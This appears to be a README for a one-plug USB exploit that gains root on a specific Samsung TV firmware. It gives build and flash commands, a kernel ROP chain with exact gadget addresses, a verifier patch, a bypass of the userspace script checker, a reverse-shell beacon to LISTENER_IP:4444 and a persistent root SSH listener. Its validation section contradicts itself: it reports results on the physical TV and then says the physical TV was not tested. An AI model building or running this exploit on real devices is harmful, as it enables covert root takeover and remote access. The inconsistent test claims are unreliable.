# One-plug USB root — GQ65Q70RGTXZG / T-MSMDEUC-1500.9

## Build and flash

```sh
cd $REPO
nix develop
python3 tools/mk_usb_stick.py \
  --exploit-profile tv \
  --beacon LISTENER_IP:4444 \
  --authorized-keys ~/.ssh/id_ed25519.pub \
  --out out/tv-usb-revshell.img --force

cd out
sha256sum -c tv-usb-revshell.img.sha256
sudo dd if=tv-usb-revshell.img of=/dev/sdX bs=4M conv=fsync status=progress
sync
```

Current built image:

```text
out/tv-usb-revshell.img       # interactive reverse shell + dropbear
out/tv-usb-research.img       # same, plus --research-kmem
size 76 MiB
```

Replace `/dev/sdX` carefully: flashing destroys that device.

## What one plug does

1. storaged mounts/enumerates p1 (exFAT).
2. The `num_ext` overflow reaches `ffsReadDir`'s saved registers.
3. The fixed, calibration-free kernel chain:
   - uses untouched `ip` (`fp+0x35c`, confirmed across multiple boots) as its
     runtime source pointer;
   - copies a cave image to the unreferenced fixed kernel-text hole
     `0xc0008358..0xc0009000`;
   - saves post-copy `r1` and restores SP to the genuine task kernel stack;
   - flushes the copied stage and jumps to it.
4. The kernel stage patches the UEP verifier at `0xc01d49b8`, flushes that
   instruction range, then starts the signed `/bin/bash` with UMH_NO_WAIT.
5. Optional `--beacon HOST:PORT` opens a background interactive root Bash;
   stage1 continues immediately rather than waiting for that shell to exit.
6. Physical-TV mount path is `/opt/media/USBDriveA2`; Bash feeds unsigned
   stage1 over stdin (`bash -s`) to bypass Samsung's userspace script checker.
7. stage1 atomically acquires `/tmp/.samsung-usb-rooted` and immediately
   lazy-unmounts only p1, making racing media workers exit before the slower
   install. It then updates changed files under `/opt`, preserves host keys,
   creates native `/run/systemd/system/dropbear-root.service`, and verifies the
   listener. The USB and p2 remain present; the on-disk trigger is unchanged.
8. SSH is available on `0.0.0.0:22`, key-only, root. At the next boot `/tmp`
   is empty and p1 triggers the same idempotent sequence again.

```sh
ssh -i ~/.ssh/id_ed25519 root@TV_ADDRESS
```

No UART, device-specific stack address, Developer Mode, pairing or second plug
is used by the image.

## Disk layout

| partition | format | contents |
|---|---|---|
| p1 | 8 MiB exFAT | from-scratch crafted trigger (`tools/mk_trigger.py`) |
| p2 | 64 MiB FAT16 | patched dropbearmulti, ed25519/RSA host keys, authorized_keys, stage1; optional research_kmem.ko |

p2 is intentionally FAT16 (`MBR type 0x0e`), which the built-in vfat driver
mounts reliably. Removable media is `noexec`; stage1 treats p2 as data and
copies the executable to `/opt` (RW VDFS, no `noexec`).

## Exact target constants and provenance

All TV addresses come from the shipped T-MSMDEUC uImage, never the lab kernel:

| purpose | address |
|---|---:|
| cave backing range | `0xc0008358..0xc0009000` |
| cave copy destination | `0xc00083d8` |
| `ldm ip,{r2,r3,r4,r7,r8,r9,sl,sp,lr,pc}` | `0xc053107c` |
| copy window (`r2=r4; r1=ip; r0=r6; blx r3`) | `0xc010a158` |
| post-copy r1 saver | `0xc04a4e5c` |
| stage0 flush wrapper | `0xc0012b94` |
| `v7_coherent_kern_range` | `0xc001cee8` |
| `memcpy` | `0xc02014c0` |
| UEP verification gate | `0xc01d49b8` |
| `call_usermodehelper` | `0xc003a2e4` |
| `schedule_timeout_uninterruptible` | `0xc051edcc` |

The cave is 3,240 zero bytes between ARM head code and main text. Ghidra and an
independent branch/literal scan found zero references into its interior.
Addresses for exported functions were recovered from the 4.1
`kernel_symbol { value, name }` table; the extractor was validated against the
lab kernel's System.map.

Gadget discovery is reproducible using only packaged tools in `flake.nix`:
ROPgadget 7.7, ropper 1.13.13, and ARM binutils. ET_REL module `.text` is first
extracted with `arm-none-eabi-objcopy`, then searched in raw ARM mode at its
runtime base.

## Validation evidence

**Observed in the vendor-kernel QEMU lab with the exact shipped exFAT modules:**

```text
P2 MOUNT OK
P1 MOUNT OK
DROPBEAR PROCESS OK
DROPBEAR LISTEN :22 OK
DROPBEAR EXEC OK
LAB: full stick e2e done
=== FULL USB E2E: PASS ===
```

This test did not manually invoke stage1: p1 readdir drove the stack corruption,
copy, cache flush and UMH, which invoked stage1 from p2.

**Observed on the physical GQ65Q70RGTXZG:** interactive root Bash over TCP,
ouserspace `uid=0(root)`, exact mounts `USBDriveA1/A2`, patched dropbear hash
`dd22a328…`, systemd-supervised listener on `0.0.0.0:22`, and successful fresh
SSH authentication from both both operator keys. The live-only inventory
is stored in `build/samsung-tv-live-20260908.tar.gz` (SHA-256
`81de6f847ac6414e71f11a10e89f36d5ff68f482c1c594e4b7346b9bb7539831`).

**Optional research mode:** `--research-kmem` adds and loads a GPL misc-device
module at `/dev/kmem`, mode `0600`, gated by module parameter `enable=1`.
Default images omit it. Lab self-test verified read/write (`KMEM-ORIGINAL` →
`XMEM-ORIGINAL`) with fault-safe `probe_kernel_read/write`.

**Observed separately:** the same static `dropbearmulti` accepted the supplied
ed25519 key and returned `uid=0(root)` over a real OpenSSH connection under
ARM emulation.

The physical TV has not been tested in this workspace. If an address or
mount-timing assumption differs from the decrypted firmware, the expected
failure is an insertion-time kernel hang; keep the firmware recovery USB
available. The build contains no device-calibrated values.
